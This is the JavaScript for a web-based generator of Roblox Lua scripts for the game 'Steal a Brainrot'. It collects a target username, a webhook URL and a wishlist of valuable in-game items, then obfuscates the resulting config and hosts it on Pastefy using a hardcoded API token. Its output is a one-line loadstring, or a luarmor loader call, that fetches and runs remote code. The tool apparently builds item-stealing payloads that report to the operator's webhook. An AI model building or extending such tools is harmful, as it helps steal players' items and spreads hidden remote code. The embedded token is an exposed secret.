document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  CONFIGURACIÓN
    // ============================================================
    const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';

    // ============================================================
    //  MODO DE EJECUCIÓN
    // ============================================================
    const modeNormal = document.getElementById('modeNormal');
    const modeCustom = document.getElementById('modeCustom');
    const secondLoadstring = document.getElementById('secondLoadstring');

    modeNormal.addEventListener('click', () => {
        modeNormal.classList.add('active');
        modeCustom.classList.remove('active');
        secondLoadstring.classList.add('hidden');
    });

    modeCustom.addEventListener('click', () => {
        modeCustom.classList.add('active');
        modeNormal.classList.remove('active');
        secondLoadstring.classList.remove('hidden');
    });

    // ============================================================
    //  SHORT LOADSTRING TOGGLE & LINK PROVIDER
    // ============================================================
    const toggleSwitch = document.getElementById('shortToggle');
    const linkProvider = document.getElementById('linkProvider');
    const providerBtns = document.querySelectorAll('.provider-btn');
    let shortEnabled = false;
    let selectedProvider = 'pastefy';

    toggleSwitch.addEventListener('click', () => {
        shortEnabled = !shortEnabled;
        toggleSwitch.classList.toggle('on', shortEnabled);
        const label = toggleSwitch.querySelector('.toggle-label');
        label.textContent = shortEnabled ? 'ON' : 'OFF';
        if (shortEnabled) {
            linkProvider.classList.remove('hidden');
        } else {
            linkProvider.classList.add('hidden');
        }
        console.log('Short Loadstring:', shortEnabled ? 'ON' : 'OFF');
    });

    providerBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            providerBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedProvider = btn.dataset.provider;
            console.log('Proveedor seleccionado:', selectedProvider);
        });
    });

    // ============================================================
    //  TODOS LOS BRAINROTS (COMPLETOS)
    // ============================================================
    const brainrotLists = {
        Common: [
            'Fluriflura', 'Holy Arepa', 'Lirilì Larilà', 'Noobini Pizzanini',
            'Noobini Santanini', 'Pipi Corni', 'Pipi Kiwi', 'Raccooni Jandelini',
            'Svinina Bombardino', 'Talpa Di Fero', 'Tartaragno', 'Tim Cheese'
        ],
        Rare: [
            'Bandito Bobritto', 'Boneca Ambalabu', 'Cacto Hipopotamo', 'Cupcake Koala',
            'Frogo Elfo', 'Gangster Footera', 'Pengolino Nuvoletto', 'Pinealotto Fruttarino',
            'Pipi Avocado', 'Ta Ta Ta Ta Sahur', 'Tric Trac Baraboom', 'Trippi Troppi'
        ],
        Epic: [
            'Avocadini Antilopini', 'Avocadini Guffo', 'Bambini Crostini', 'Bananita Dolphinita',
            'Brr Brr Patapim', 'Brri Brri Bicus Dicus Bombicus', 'Cappuccino Assassino',
            'Doi Doi Do', 'Frogato Pirato', 'Gato Celesto', 'Malame Amarele',
            'Mangolini Parrocini', 'Mummio Rappitto', 'Penguin Tree', 'Penguino Cocosino',
            'Perochello Lemonchello', 'Salamino Penguino', 'Ti Ti Ti Sahur',
            'Trulimero Trulicina', 'Wombo Rollo'
        ],
        Legendary: [
            'Ballerina Cappuccina', 'Bandito Axolito', 'Blueberrinni Octopusini',
            'Buho de Fuego', 'Buho del Cielo', 'Burbaloni Loliloli', 'Caramello Filtrello',
            'Chef Crabracadabra', 'Chimpanzini Bananini', 'Chocco Bunny', 'Clickerino Crabo',
            'Cocosini Mama', 'Electro Quacko', 'Glorbo Fruttodrillo', 'Lionel Cactuseli',
            'Pandaccini Bananini', 'Pi Pi Watermelon', 'Pipi Potato', 'Puffaball',
            'Quackula', 'Quivioli Ameleonni', 'Sealo Regalo', 'Seraphino Gruyero',
            'Sigma Boy', 'Sigma Girl', 'Strawberrelli Flamingelli'
        ],
        Mythic: [
            'Avocadorilla', 'Bananito Bandito', 'Bee Loco', 'Berenjello Angello',
            'Bombardiro Crocodilo', 'Bombombini Gusini', 'Brutto Gialutto', 'Bucketoro',
            'Cachorrito Melonito', 'Carloo', 'Carrotini Brainini', 'Cavallo Virtuoso',
            'Centrucci Nuclucci', 'Cocoteddy', 'Fizzy Soda', 'Frigo Camelo',
            'Ganganzelli Trulala', 'Gorillo Subwoofero', 'Gorillo Watermelondrillo',
            'Harpuccino', 'Jacko Spaventosa', 'Jingle Jingle Sahur', 'Lerulerulerule',
            'Los Noobinis', 'Lucky Block', 'Magi Ribbitini', 'Orangutini Ananassini',
            'Orbi Mochi', 'Rhino Helicopterino', 'Rhino Toasterino', 'Spioniro Golubiro',
            'Spongini Quackini', 'Stoppo Luminino', 'Te Te Te Sahur', 'Tigrilini Watermelini',
            'Tob Tobi Tobi', 'Toiletto Focaccino', 'Tracoducotulu Delapeladustuz',
            'Tree Tree Tree Sahur', 'Zibra Zubra Zibralini'
        ],
        'Brainrot God': [
            'Alessio', 'Anpali Babel', 'Appelini', 'Aquanaut', 'Astrolero Cervalero',
            'Ballerina Peppermintina', 'Ballerino Lololo', 'Bambu Bambu Sahur',
            'Belula Beluga', 'Boba Panda', 'Bombardini Tortinii', 'Brasilini Berimbini',
            'Brr es Teh Patipum', 'Buho de Noelo', 'Bulbito Bandito Traktorito',
            'Bunny Tralala', 'Cacasito Satalito', 'Capi Taco', 'Cappuccino Clownino',
            'Chihuanini Taconini', 'Chrismasmamat', 'Clovkur Kurkur', 'Cocoa Assassino',
            'Cocofanto Elefanto', 'Cola Cat', 'Corn Corn Corn Sahur', 'Crabbo Limonetta',
            'Divino Platypio', 'Dolphini Jetskini', 'Dumborino Miracello', 'Eggdin Egg Egg Dun',
            'Espresso Signora', 'Extinct Ballerina', 'Flippo Marino', 'Frio Ninja',
            'Gattatino Nyanino', 'Gattito Tacoto', 'Ginger Cisterna', 'Ginger Globo',
            'Girafa Celestre', 'Granchiello Spiritell', 'Jacko Jack Jack', 'Karkerheart Luvkur',
            'Krupuk Pagi Pagi', 'Las Capuchinas', 'Lazy Ducky', 'Lemonita Splashita',
            'Los Bombinitos', 'Los Chihuaninis', 'Los Crocodillitos', 'Los Gattitos',
            'Los Orcalitos', 'Los Tipi Tacos', 'Los Tungtungtungcitos', 'Lucky Block',
            'Lumaca Malefica', 'Luv Luv Luv', 'Mastodontico Telepiedone', 'Matteo',
            'Money Money Man', 'Mummy Ambalabu', 'Noo La Polizia', 'Odin Din Din Dun',
            'Orcalero Orcala', 'Orcalita Orcala', 'Pakrahmatmamat', 'Pakrahmatmatina',
            'Pandanini Frostini', 'Patteo', 'Piccione Macchina', 'Piccionetta Macchina',
            'Pineaplino', 'Pop Pop Sahur', 'Pretzo Robo', 'Robo Grafito', 'Skull Skull Skull',
            'Snailenzo', 'Squalanana', 'Sundrilla Sundae', 'Tartaruga Cisterna',
            'Tenini Ballini', 'Tentacolo Tecnico', 'Tigroligre Frutonni', 'Tipi Topi Taco',
            'Tootini Shrimpini', 'Tortuginni Sandcastlini', 'Tractoro Dinosauro',
            'Tralalero Tralala', 'Tralalita Tralala', 'Trenostruzzo Turbo 3000',
            'Trenotubo Axolotrico 9000', 'Trippi Troppi Troppa Trippa', 'Tukanno Bananno',
            'Unclito Samito', 'Urubini Flamenguini', 'Vampira Cappucina', 'Yeti Claus'
        ],
        Secret: [
            '1x1x1x1', '25', '67', 'Abyssaloco', 'Agarrini la Palini', 'Antonio',
            'Aquarino', 'Arcadopus', 'Arcadragon', 'Bacuru and Egguru', 'Bananito',
            'Baskito', 'Bearito Cabinito', 'Berryno', 'Bisonte Giuppitere',
            'Blackhole Goat', 'Boatito Auratito', 'Bombardiro Vaccariro', 'Boppin Bunny',
            'Brunito Marsito', 'Buho de Volto', 'Bunito Bunito Spinito',
            'Bunny Bunny Bunny Sahur', 'Bunny and Eggy', 'Bunnyman', 'Buntteo',
            'Burguro And Fryuro', 'Burrito Bandito', 'Camera Ramena', 'Capitano Gullini',
            'Capitano Moby', 'Cash or Card', 'Caylusaurus', 'Celestial Pegasus',
            'Celularcini Viciosini', 'Cerberus', 'Chachechi', 'Chicleteira Bicicleteira',
            'Chicleteira Cupideira', 'Chicleteira Noelteira', 'Chicleteira Surfeiteira',
            'Chicleteirina Bicicleteirina', 'Chill Puppy', 'Chillin Chili', 'Chimnino',
            'Chipso and Queso', 'Churrito Bunnito', 'Cigno Fulgoro', 'Cloverat Clapat',
            'Coco and Mango', 'Cooki and Milki', 'Craburger', 'Cuadramat and Pakrahmatmamat',
            'Cupid Cupid Sahur', 'Cupid Hotspot', 'DJ Panda', 'Digi Narwhal',
            'Donkeyturbo Express', 'Dragon Aquanini', 'Dragon Cannelloni',
            'Dragon Gingerini', 'Dug dug dug', 'Duggy Bros', 'Dul Dul Dul',
            'Easter Easter Easter Sahur', 'Eid Eid Eid Sahur', 'Elefanto Frigo',
            'Esok Sekolah', 'Eviledon', 'Extinct Matteo', 'Extinct Tralalero',
            'Festive 67', 'Fishboard', 'Fishino Clownino', 'Flancito', 'Flipa Sandala',
            'Fortunu and Cashuru', 'Foxini Lanternini', 'Fragola La La La',
            'Fragrama and Chocrama', 'Frankentteo', 'Frullato Framingo', 'Futbolini Skatini',
            'GOAT', 'Garama and Madundung', 'Gelato Lumacho', 'Giftini Spyderini',
            'Ginger Gerat', 'Girafini Raftini', 'Glaciator', 'Globa Steppa',
            'Gobblino Uniciclino', 'Gold Egg', 'Gold Elf', 'Gold Gold Gold',
            'Graipuss Medussi', 'Granny', 'Granny', 'Griffin', 'Guerriro Digitale',
            'Guest 666', 'Gym Bros', 'Ho Ho Ho Sahur', 'Hopilikalika Hopilikalako',
            'Horegini Boom', 'Hydra Bunny', 'Hydra Dragon Cannelloni', 'Jackorilla',
            'Jelly Moby', 'Job Job Job Sahur', 'John Doe', 'Jolly Jolly Sahur',
            'Kalika Bros', 'Karker Sahur', 'Karkerkar Kurkur', 'Ketchuru and Musturu',
            'Ketupat Bros', 'Ketupat Kepat', 'Kraken', 'La Anniversary Grande',
            'La Casa Boo', 'La Cucaracha', 'La Easter Grande', 'La Extinct Grande',
            'La Food Combinasion', 'La Ginger Sekolah', 'La Grande Combinasion',
            'La Jolly Grande', 'La Karkerkar Combinasion', 'La Lucky Grande',
            'La Romantic Grande', 'La Sahur Combinasion', 'La Secret Combinasion',
            'La Spooky Grande', 'La Summer Grande', 'La Supreme Combinasion',
            'La Taco Combinasion', 'La Vacca Jacko Linterino', 'La Vacca Lepre Lepreino',
            'La Vacca Prese Presente', 'La Vacca Saturno Saturnita', 'Las Sis',
            'Las Tralaleritas', 'Las Vaquitas Saturnitas', 'Lavadorito Spinito',
            'List List List Sahur', 'Los 25', 'Los 67', 'Los Amigos', 'Los Bros',
            'Los Bunitos', 'Los Burritos', 'Los Candies', 'Los Chicleteiras',
            'Los Chillis', 'Los Combinasionas', 'Los Cucarachas', 'Los Cupids',
            'Los Fruits', 'Los Hackers', 'Los Hotspotsitos', 'Los Jobcitos',
            'Los Jolly Combinasionas', 'Los Karkeritos', 'Los Mariachis', 'Los Matteos',
            'Los Mi Gatitos', 'Los Mobilis', 'Los Nooo My Hotspotsitos', 'Los Planitos',
            'Los Primos', 'Los Puggies', 'Los Quesadillas', 'Los Sekolahs',
            'Los Spaghettis', 'Los Spooky Combinasionas', 'Los Spyderinis',
            'Los Sweethearts', 'Los Tacoritas', 'Los Tortus', 'Los Tralaleritos',
            'Los Trios', 'Love Love Bear', 'Love Love Love Sahur', 'Lovin Rose',
            'Luck Luck Luck Sahur', 'Lucky Block', 'Mariachi Corazoni', 'Mi Gatito',
            'Mieteteira Bicicleteira', 'Money Money Bros', 'Money Money Puggy',
            'Money Money Reindeer', 'Nacho Spyder', 'Naughty Naughty', 'Noo my Candy',
            'Noo my Eggs', 'Noo my Gold', 'Noo my Heart', 'Noo my Present',
            'Noo my examine', 'Nooo My Hotspot', 'Nuclearo Dinossauro', 'Octoball',
            'Ombrello Topolino', 'Orcaledon', 'Pancake and Syrup', 'Paradiso Axolottino',
            'Perrito Burrito', 'Pirulitoita Bicicleteira', 'Please my Present',
            'Popcuru and Fizzuru', 'Pot Hotspot', 'Pot Pumpkin', 'Pumpkini Spyderini',
            'Quackini Snackini', 'Quesadilla Crocodila', 'Quesadillo Vampiro',
            'Rang Ring Bus', 'Reindeer Tralala', 'Reinito Sleighito', 'Rico Dinero',
            'Rocco Disco', 'Rocketini Frostini', 'Rosetti Tualetti', 'Rosey and Teddy',
            'Rubrikiko', 'Sammyni Cakini', 'Sammyni Fattini', 'Sammyni Spyderini',
            'Sand Sand Sand', 'Santa Hotspot', 'Santteo', 'Serafinna Medusella',
            'Signore Carapace', 'Snailo Clovero', 'Spaghetti Tualetti', 'Spinny Hammy',
            'Spooky and Pumpky', 'Steakini Fattini', 'Strawberrita', 'Sushi Inu',
            'Swag Soda', 'Swaggy Bros', 'Tacorillo Crocodillo', 'Tacorita Bicicleta',
            'Tang Tang Keletang', 'Telemorte', 'Tictac Sahur', 'Tirilikalika Tirilikalako',
            'To to to Sahur', 'Torrtuginni Dragonfrutini', 'Tralaledon',
            'Trenostruzzo Turbo 4000', 'Trickolino', 'Triplito Tralaleritos',
            'Tuff Toucan', 'Ventoliero Pavonero', 'Venuspino', 'Vulturino Skeletono',
            'W or L', 'Yess my examine', 'Zombie Tralala'
        ],
        OG: [
            'Headless Horseman', 'John Pork', 'Meowl', 'Skibidi Toilet',
            'Spyder Elephant', 'Strawberry Elephant'
        ],
        Easter: [
            'Baskito Egg', 'Bunny Bunny Bunny Sahur Egg', 'Bunny Tralala Egg',
            'Buntteo Egg', 'Churrito Bunnito Egg', 'Easter Easter Easter Sahur Egg',
            'Egg Lucky Block', 'Eggdin Egg Egg Dun Egg', 'Hopilikalika Hopilikalako Egg',
            'Hydra Bunny Egg', 'Los Bunitos Egg', 'Noo my Eggs Egg',
            'Premium Egg Lucky Block', 'Quackini Snackini Egg'
        ],
        Summer: ['Octo Lucky Block', 'Premium Octo Lucky Block'],
        Taco: ['Los Taco Blocks', 'Lucky Block'],
        'St Patrick\'s': ['Leprechaun Lucky Block', 'Premium Leprechaun Lucky Block'],
        Festive: ['Festive Lucky Block', 'Premium Festive Lucky Block'],
        Valentines: ['Heart Lucky Block', 'Premium Heart Lucky Block'],
        Admin: ['Los Lucky Blocks', 'Lucky Block'],
        Spooky: ['Spooky Lucky Block']
    };

    const brainrotData = [];
    const recommendedRarities = ['Secret', 'Brainrot God', 'OG'];
    const recommendedNames = ['Lucky Block', 'Sigma Boy', 'Sigma Girl'];

    for (const [rarity, names] of Object.entries(brainrotLists)) {
        names.forEach(name => {
            const isRecommended = recommendedRarities.includes(rarity) || recommendedNames.includes(name);
            brainrotData.push({ name, rarity, recommended: isRecommended });
        });
    }

    // ============================================================
    //  DATOS DE SKINS Y GEARS
    // ============================================================
    const skinItems = [
        'Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket',
        'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines',
        'Easter', 'Lucky', 'Aquatic'
    ];

    const gearItems = [
        "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
        "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
        "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap",
        "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
        "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster",
        "Alien Slap", "Blackhole Bomb", "Candy Sentry"
    ];

    // ============================================================
    //  FUNCIONES DE RENDERIZADO
    // ============================================================
    function renderPills(containerId, items, searchId, counterId, allId, noneId) {
        const container = document.getElementById(containerId);
        const searchInput = document.getElementById(searchId);
        const counterSpan = document.getElementById(counterId);
        const allBtn = document.getElementById(allId);
        const noneBtn = document.getElementById(noneId);

        const selected = new Set();
        let filteredItems = [...items];

        function render() {
            const searchTerm = searchInput.value.toLowerCase().trim();
            filteredItems = items.filter(item => item.toLowerCase().includes(searchTerm));

            container.innerHTML = '';
            filteredItems.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item)) pill.classList.add('selected');
                pill.textContent = item;
                pill.dataset.value = item;

                pill.addEventListener('click', () => {
                    if (selected.has(item)) {
                        selected.delete(item);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        allBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        searchInput.addEventListener('input', render);
        render();
        return selected;
    }

    function renderBrainrots() {
        const container = document.getElementById('brainrotsContainer');
        const searchInput = document.getElementById('brainrotsSearch');
        const counterSpan = document.getElementById('brainrotsCounter');
        const allBtn = document.getElementById('brainrotsAll');
        const noneBtn = document.getElementById('brainrotsNone');
        const filterBtns = document.querySelectorAll('.filter-btn');

        const selected = new Set();
        let currentFilter = 'all';
        let searchTerm = '';

        const eventRarities = ['Easter', 'Summer', 'Taco', 'St Patrick\'s', 'Festive', 'Valentines', 'Admin', 'Spooky'];

        function getFilteredItems() {
            let filtered = brainrotData;
            if (searchTerm) {
                filtered = filtered.filter(item =>
                    item.name.toLowerCase().includes(searchTerm.toLowerCase())
                );
            }
            if (currentFilter === 'all') {
                // todos
            } else if (currentFilter === 'Events') {
                filtered = filtered.filter(item => eventRarities.includes(item.rarity));
            } else if (currentFilter === 'Recommended') {
                filtered = filtered.filter(item => item.recommended === true);
            } else {
                filtered = filtered.filter(item => item.rarity === currentFilter);
            }
            return filtered;
        }

        function render() {
            const filtered = getFilteredItems();
            container.innerHTML = '';
            filtered.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item.name)) pill.classList.add('selected');
                pill.textContent = item.name;
                pill.dataset.value = item.name;

                pill.addEventListener('click', () => {
                    if (selected.has(item.name)) {
                        selected.delete(item.name);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item.name);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        filterBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentFilter = btn.dataset.rarity;
                render();
            });
        });

        searchInput.addEventListener('input', (e) => {
            searchTerm = e.target.value;
            render();
        });

        allBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        render();
        return selected;
    }

    // ============================================================
    //  INICIALIZAR
    // ============================================================
    const brainrotsSelected = renderBrainrots();
    const skinsSelected = renderPills('skinsContainer', skinItems, 'skinsSearch', 'skinsCounter', 'skinsAll', 'skinsNone');
    const gearsSelected = renderPills('gearsContainer', gearItems, 'gearsSearch', 'gearsCounter', 'gearsAll', 'gearsNone');

    // ============================================================
    //  FUNCIONES DE API (WeAreDevs + Pastefy)
    // ============================================================

    // --- OFUSCAR CON WeAreDevs (URL CORREGIDA) ---
    async function obfuscateWithWeAreDevs(script) {
        const response = await fetch('/api/obfuscate', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ script: script })
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
        }

        const data = await response.json();

        if (!data.success) {
            throw new Error(data.error || 'WeAreDevs devolvió success: false');
        }

        const obfuscated = data.obfuscated;
        if (!obfuscated) {
            throw new Error(`No se pudo obtener el script ofuscado. Respuesta: ${JSON.stringify(data)}`);
        }
        return obfuscated;
    }

    // --- PASTEFY ---
    async function createPastefyPaste(content) {
        const url = 'https://pastefy.app/api/v2/paste';
        const payload = {
            content: content,
            title: 'OBLIVION Script',
            syntax: 'lua',
            expires: 'never'
        };

        console.log('Subiendo a Pastefy...');

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${PASTEFY_API_TOKEN}`
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error Pastefy:', errorText);
            throw new Error(`Pastefy error (${response.status}): ${errorText}`);
        }

        const result = await response.json();
        console.log('Respuesta Pastefy:', result);

        let pasteId = null;
        if (result.paste && result.paste.id) {
            pasteId = result.paste.id;
        } else if (result.id) {
            pasteId = result.id;
        } else if (result._id) {
            pasteId = result._id;
        } else if (result.pasteId) {
            pasteId = result.pasteId;
        }

        if (!pasteId) {
            throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
        }

        return `https://pastefy.app/${pasteId}/raw`;
    }

    // ============================================================
    //  GENERAR SCRIPT (FLUJO CORREGIDO)
    // ============================================================
    const generateBtn = document.getElementById('generateBtn');
    const outputSection = document.getElementById('outputSection');
    const outputCode = document.getElementById('outputCode');
    const copyBtn = document.getElementById('copyBtn');

    function getSelectedValues(set) {
        return Array.from(set);
    }

    // --- NUEVA FUNCIÓN: SOLO CONFIGURACIÓN (SIN task.spawn) ---
    function buildConfigScript() {
        const username = document.getElementById('username').value.trim() || 'USERNAME';
        const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';
        const mode = document.querySelector('.mode-btn.active')?.id === 'modeNormal' ? 'NORMAL' : 'CUSTOM';
        const customLoadstring = document.getElementById('customLoadstring').value.trim();

        const brainrots = getSelectedValues(brainrotsSelected);
        const skins = getSelectedValues(skinsSelected);
        const gears = getSelectedValues(gearsSelected);

        function luaTable(arr, indent = '    ') {
            if (arr.length === 0) return '{}';
            const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
            return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
        }

        let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
        script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;

        const modePrefix = mode === 'NORMAL' ? 'NORMAL' : 'CUSTOM';

        if (mode === 'NORMAL') {
            script += `getgenv().${modePrefix}_BRAINROTS = ${luaTable(brainrots)}\n`;
            script += `getgenv().${modePrefix}_BASE_SKINS = ${luaTable(skins)}\n`;
            script += `getgenv().${modePrefix}_GEARS = ${luaTable(gears)}\n`;
        } else {
            script += `getgenv().CUSTOM_LOADSTRING = [[\n${customLoadstring || '-- No custom loadstring'}\n]]\n`;
            script += `getgenv().${modePrefix}_BRAINROTS = ${luaTable(brainrots)}\n`;
            script += `getgenv().${modePrefix}_BASE_SKINS = ${luaTable(skins)}\n`;
            script += `getgenv().${modePrefix}_GEARS = ${luaTable(gears)}\n`;
        }

        return script;
    }

    generateBtn.addEventListener('click', async () => {
        generateBtn.textContent = 'GENERANDO...';
        generateBtn.disabled = true;

        try {
            if (shortEnabled && selectedProvider === 'pastefy') {
                try {
                    // 1. Construir script de configuración (sin task.spawn)
                    const configScript = buildConfigScript();
                    console.log('Configuración a ofuscar:');
                    console.log(configScript);

                    // 2. Ofuscar con WeAreDevs
                    console.log('Ofuscando con WeAreDevs...');
                    const obfuscatedScript = await obfuscateWithWeAreDevs(configScript);
                    console.log('Ofuscación completada.');

                    // 3. Subir el script ofuscado a Pastefy
                    console.log('Subiendo a Pastefy...');
                    const pastefyUrl = await createPastefyPaste(obfuscatedScript);
                    console.log('Paste creado:', pastefyUrl);

                    // 4. El script final será SOLO la línea loadstring
                    const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
                    outputCode.textContent = finalScript;

                } catch (apiError) {
                    console.error('Error en el flujo automático:', apiError);
                    alert(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`);
                    // Fallback: mostrar el script de configuración (sin ofuscar) con URL por defecto
                    const configScript = buildConfigScript();
                    const fallbackScript = configScript + 
                        `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"))()\nend)`;
                    outputCode.textContent = fallbackScript;
                }

            } else if (shortEnabled) {
                // Otros proveedores (no implementados)
                const configScript = buildConfigScript();
                const providerUrls = {
                    pastefy: '',
                    voidexternal: 'https://void.external/raw/...',
                    rubis: 'https://rubis.xyz/raw/...'
                };
                const url = providerUrls[selectedProvider] || 'https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua';
                const fallbackScript = configScript + 
                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("${url}"))()\nend)`;
                outputCode.textContent = fallbackScript;

            } else {
                // Modo normal (sin short loadstring)
                const configScript = buildConfigScript();
                const normalScript = configScript + 
                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"))()\nend)`;
                outputCode.textContent = normalScript;
            }

            outputSection.classList.remove('hidden');
            outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            copyBtn.textContent = 'COPY';
            copyBtn.classList.remove('copied');

        } catch (error) {
            console.error('Error al generar el script:', error);
            alert(`Error al generar el script: ${error.message}`);
        } finally {
            generateBtn.textContent = 'GENERATE SCRIPT';
            generateBtn.disabled = false;
        }
    });

    // ============================================================
    //  COPY
    // ============================================================
    copyBtn.addEventListener('click', async () => {
        const text = outputCode.textContent;
        if (!text) return;
        try {
            await navigator.clipboard.writeText(text);
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        } catch (err) {
            const range = document.createRange();
            range.selectNode(outputCode);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        }
    });

});
